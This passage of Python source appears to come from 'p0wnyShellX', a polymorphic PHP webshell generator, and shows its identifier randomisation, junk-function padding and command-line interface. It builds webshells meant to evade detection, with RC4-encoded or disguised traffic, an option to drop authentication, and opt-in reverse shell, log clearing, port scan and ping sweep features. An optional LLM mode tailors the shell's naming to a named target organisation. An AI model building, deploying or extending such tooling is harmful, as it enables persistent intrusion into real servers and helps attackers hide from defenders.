    # Session cookie name — a per-build plausible custom name instead of PHPSESSID
    n['sess_name'] = rng.choice(['SESSID', 'APPSESSID', 'OPSSESSION', 'NODESESS',
                                 'SVCSESSION', 'CONSOLE_SID', 'MGRID', 'SESSKEY'])

    # JS function names
    used_js = set()
    jv = {}
    for key in ['append_line','insert_stdout','pipe_call','resolve_task','suggest_entry',
                'save_blob','trigger_export','file_to_stream','get_header','refresh_scope',
                'neutralize_html','update_meta','dispatch_key','cache_query','b64u']:
        jv[key] = pick(js_pool, used_js, rng)

    used_jv = set()
    for key in ['cfg','cwd','cmd_history','history_pos','e_input','e_content']:
        jv[key] = pick(JS_VAR_POOL, used_jv, rng)

    # HTML IDs
    used_ids = set()
    ids = {}
    for key in ['shell','stream','entry','cmd','prompt']:
        ids[key] = pick(HTML_ID_POOL, used_ids, rng)
    ids['header']     = 'hdr-' + rnd_token(rng, 5)
    ids['prompt_cls'] = 'ctx-' + rnd_token(rng, 5)

    # Junk functions
    all_junk = gen_junk_functions(rng, junk_count, used_php,
                                  pool=php_pool, extra_words=junk_words)
    rng.shuffle(all_junk)
    mid = len(all_junk) // 2
    junk_before = all_junk[:mid]
    junk_after  = all_junk[mid:]

    # Case order — optional features compiled in only if explicitly requested
    case_order = ['shell', 'pwd', 'hint', 'upload']
    if args.revshell:
        case_order.append('revshell')
    if args.clearlog:
        case_order.append('clearlog')
    if args.portscan:
        case_order.append('portscan')
    if args.pingsweep:
        case_order.append('pingsweep')
    rng.shuffle(case_order)

    # Version
    ver = f"{rng.randint(1,9)}.{rng.randint(0,9)}.{rng.randint(0,999)}"

    # Transport context (param names + optional crypto keys)
    transport_ctx = generate_transport_context(rng, args.transport, param_pool=mimic_pool)

    features = {
        'revshell':  args.revshell,
        'clearlog':  args.clearlog,
        'portscan':  args.portscan,
        'pingsweep': args.pingsweep,
    }

    return build_php_section(
        n, jv, ids, route_param, routes, session_key_val,
        bcrypt_hash, args.user, junk_before, junk_after,
        case_order, theme, ver, rng,
        args.transport, transport_ctx, features,
        no_auth=args.no_auth,
        poly_app_names=poly_names,
    )

# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description='p0wnyShellX — Polymorphic PHP webshell generator. Produces a unique shell on every run.',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 p0wnyShellX.py -p "MyPass!" -o shell.php
  python3 p0wnyShellX.py -p "MyPass!" -t matrix -j 50 -o shell.php
  python3 p0wnyShellX.py -p "MyPass!" -t zabbix --no-junk -u operator -o shell.php
  python3 p0wnyShellX.py -p "MyPass!" -t poly -o shell.php
  python3 p0wnyShellX.py -p "MyPass!" -t none -o shell.php
  python3 p0wnyShellX.py -p "MyPass!" --seed 42 -o repro.php
  python3 p0wnyShellX.py -p "MyPass!" --transport mimic -o shell.php
  python3 p0wnyShellX.py -p "MyPass!" --transport rc4 -o shell.php
  python3 p0wnyShellX.py -p "MyPass!" --llm ollama -o shell.php
  python3 p0wnyShellX.py -p "MyPass!" --llm ollama:qwen2.5 --company "Acme Logistics" -o shell.php
  python3 p0wnyShellX.py -p "MyPass!" --llm anthropic --company "Acme" --context "logistics, France" -o shell.php
"""
    )
    parser.add_argument('-p', '--password', default='changeme666',
                        help='Login password (default: changeme666)')
    parser.add_argument('-u', '--user', default='sysadmin',
                        help='Login username (default: sysadmin)')
    parser.add_argument('-o', '--output', default='shell.php',
                        help='Output file path (default: shell.php). Accepts absolute or relative paths, e.g. -o /tmp/shell.php')
    parser.add_argument('--stdout', action='store_true', default=False,
                        help='Print generated PHP to stdout instead of writing a file. Status messages go to stderr.')
    parser.add_argument('-j', '--junk', type=int, default=None,
                        help='Number of junk functions (default: random 20-80, max 200)')
    parser.add_argument('-t', '--theme', choices=list(CSS_THEMES.keys()) + ['poly', 'none'], default=None,
                        help='CSS theme: infra-dark | corporate-blue | matrix | zabbix | ctos | fsociety | russia | korea | france | usa | redux | poly | none (default: random from named themes)')
    parser.add_argument('-s', '--seed', type=int, default=None,
                        help='RNG seed for reproducible output')
    parser.add_argument('--no-junk', action='store_true',
                        help='Disable junk function generation')
    parser.add_argument('--transport', choices=['plain','mimic','rc4'], default='plain',
                        help='AJAX traffic encoding — plain: no encoding (default); mimic: standard base64 with random param names; rc4: RC4 + per-build shuffled base64 alphabet')
    parser.add_argument('--no-auth', action='store_true', default=False,
                        help='Generate shell without authentication (no login form, no session, no bcrypt — direct access)')
    parser.add_argument('--revshell', action='store_true', default=False,
                        help='Compile revshell command into the shell (opt-in; not included by default)')
    parser.add_argument('--clearlog', action='store_true', default=False,
                        help='Compile clearlog command into the shell (opt-in; not included by default)')
    parser.add_argument('--portscan', action='store_true', default=False,
                        help='Compile portscan command into the shell (opt-in; not included by default)')
    parser.add_argument('--pingsweep', action='store_true', default=False,
                        help='Compile pingsweep command into the shell (opt-in; not included by default)')
    parser.add_argument('-d', '--outdir', default=None,
                        help='Output directory. Combined with -o (filename only). E.g. -d /tmp/ -o shell.php → /tmp/shell.php')
    parser.add_argument('--llm', default=None, metavar='SPEC',
                        help='Optional LLM pool augmentation, off by default. SPEC = provider[:model] with '
                             'provider in ollama | deepseek | anthropic | openai | kimi. Local: ollama (OLLAMA_HOST, '
                             'default http://localhost:11434). Cloud: key from DEEPSEEK_API_KEY / ANTHROPIC_API_KEY / '
                             'OPENAI_API_KEY / MOONSHOT_API_KEY. Falls back to static pools on any failure.')
    parser.add_argument('--company', default=None, metavar='NAME',
                        help='Target organization name — LLM generates names/strings in its vocabulary (requires --llm)')
    parser.add_argument('--context', default=None, metavar='TEXT',
                        help='Extra target context, e.g. "logistics, France" (requires --llm)')
    parser.add_argument('-V', '--version', action='version', version=f'%(prog)s {VERSION}')
    args = parser.parse_args()

    if args.outdir:
        outname = os.path.basename(args.output) if args.output != 'shell.php' else 'shell.php'
        args.output = os.path.join(args.outdir.rstrip('/'), outname or 'shell.php')
    elif os.path.isdir(args.output):
        args.output = os.path.join(args.output, 'shell.php')

    if args.junk is not None and (args.junk < 0 or args.junk > 200):
        parser.error('--junk must be between 0 and 200')

    if args.no_junk:
        args.junk = 0

    # Optional LLM augmentation wiring
    args.llm_provider = None
    if (args.company or args.context) and not args.llm:
        print("[!] --company/--context have no effect without --llm — ignoring", file=sys.stderr)
    if args.llm:
        try:
            args.llm_provider = LLMProvider(args.llm, company=args.company, context=args.context)
        except ValueError as e:
            parser.error(str(e))
        if args.seed is not None:
            print("[!] --seed makes the RNG deterministic but LLM output is not — "
                  "seeded + LLM builds are not reproducible", file=sys.stderr)
        if args.company and args.llm_provider.provider != 'ollama':
            print(f"[!] OPSEC: --company sends the target name to {args.llm_provider.provider} — "
                  f"prefer --llm ollama (local) for sensitive engagements", file=sys.stderr)

    # When --stdout is set, info messages go to stderr so PHP can be piped cleanly
    info = sys.stderr if args.stdout else sys.stdout

    php = generate(args, info=info)

    if args.stdout:
        sys.stdout.write(php)
    else:
        with open(args.output, 'w', encoding='utf-8') as f:
            f.write(php)

    theme_used = args.theme or '(random from named themes)'
    junk_used  = args.junk if args.junk is not None else '(random 20-80)'

    if not args.stdout:
        print(f"[+] Output    : {args.output}", file=info)
    print(f"[+] Size      : {len(php):,} bytes", file=info)
    print(f"[+] Theme     : {theme_used}", file=info)
    print(f"[+] Junk      : {junk_used} functions", file=info)
    print(f"[+] Transport : {args.transport}", file=info)
    if args.llm_provider:
        ctx_bits = [b for b in (args.company, args.context) if b]
        print(f"[+] LLM       : {args.llm_provider.provider}:{args.llm_provider.model}"
              + (f" (context: {', '.join(ctx_bits)})" if ctx_bits else ""), file=info)
    if args.seed:
        print(f"[+] Seed      : {args.seed}", file=info)

if __name__ == '__main__':
    main()
